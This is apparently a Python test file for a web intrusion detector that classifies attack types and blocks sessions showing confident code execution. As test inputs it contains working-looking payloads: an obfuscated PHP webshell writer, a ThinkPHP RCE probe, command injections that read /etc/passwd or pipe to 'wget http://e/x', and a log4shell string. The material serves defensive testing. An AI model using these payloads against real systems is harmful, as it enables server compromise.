"""Server-side code injection is typed cmdi, and one confident code-execution payload blocks the visitor."""
import pandas as pd

from ml.attack_type import attack_types, is_code_injection
from ml.defense import add_defense, code_execution_sessions, escalate_code_execution

SHELL = ("/index.php?s=<?=md5('x');/**/$f=strrev('stnetnoc_tup_elif');$d='base64_'.strrev('edoced');"
         "$f('lan.php',$d('PD9waHA='));?>")


def test_php_code_is_code_injection():
    assert is_code_injection(SHELL)
    assert is_code_injection("/x?a=%3C%3Fphp%20system('id')%3B%20%3F%3E")
    assert is_code_injection("/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5")
    assert is_code_injection("/a", "cmd=eval(base64_decode('aWQ='))")


def test_js_and_python_code_keep_their_type():
    assert not is_code_injection("/a?q=<img src=x onerror=eval(atob('YQ=='))>")         # XSS
    assert not is_code_injection("/a?q={{os.popen('id').read()}}")                       # SSTI


def test_normal_text_is_not_code_injection():
    for p in ["/", "/search?q=system design", "/blog/eval-results", "/docs/php/", "/a?x=assert",
              "/q?text=what is base64", "/page?id=1"]:
        assert not is_code_injection(p), p


def test_code_injection_overrides_type():
    assert attack_types(["GET"], [SHELL], [""]) == ["cmdi"]
    assert attack_types(["GET"], ["/a?id=1' union select 1--"], [""]) == ["sqli"]


def _req(types, probs):
    n = len(types)
    return pd.DataFrame({"session": [f"s{i}" for i in range(n)], "ip": [f"1.1.1.{i}" for i in range(n)],
                         "pred": 1, "type_pred": types, "attack_prob": probs, "session_attack": 0,
                         "behaviour": "", "method": "GET", "path": "/a?x=1", "body": "", "status": 200})


def _sessions(n):
    return pd.DataFrame({"session": [f"s{i}" for i in range(n)], "ip": [f"1.1.1.{i}" for i in range(n)],
                         "risk_score": 15, "risk_level": "low", "reasons": [["1 requests carry an attack payload"]] * n,
                         "attack_requests": 1, "failed_logins": 0, "max_ids_one_resource": 0, "probes": 0,
                         "not_found": 0, "server_errors": 0, "stage": "intrusion"})


def test_only_confident_code_execution_escalates():
    req = _req(["cmdi", "cmdi", "sqli", "log4shell"], [0.99, 0.75, 1.0, 0.95])
    req["path"] = ["/a?ip=1.1.1.1;cat /etc/passwd", "/a?ip=1;id", "/a?id=1' or 1=1--", "/a?x=${jndi:ldap://e/a}"]
    assert code_execution_sessions(req) == ["s0", "s3"]
    s = escalate_code_execution(req, _sessions(4)).set_index("session")
    assert s.loc["s0", "risk_level"] == "high" and s.loc["s0", "risk_score"] == 70
    assert s.loc["s1", "risk_level"] == "low" and s.loc["s2", "risk_score"] == 15


def test_cmdi_without_shell_command_does_not_escalate():
    req = _req(["cmdi", "cmdi"], [0.99, 0.99])
    req["path"] = ["/cgi-bin/w3magic.cgi?-f|test", SHELL]          # old CGI pipe argument vs PHP code
    assert code_execution_sessions(req) == ["s1"]


def test_code_execution_is_blocked_even_once():
    req = _req(["cmdi", "sqli"], [0.99, 1.0])
    req["path"] = ["/a?host=x|wget http://e/x", "/a?id=1' or 1=1--"]
    out = add_defense(req, _sessions(2), tree=None).set_index("session")
    assert out.loc["s0", "action"] == "block"
    assert "run code" in out.loc["s0", "action_reason"] or out.loc["s0", "risk_level"] == "high"
    assert out.loc["s1", "action"] == "allow"                 # one SQLi-looking request: unchanged
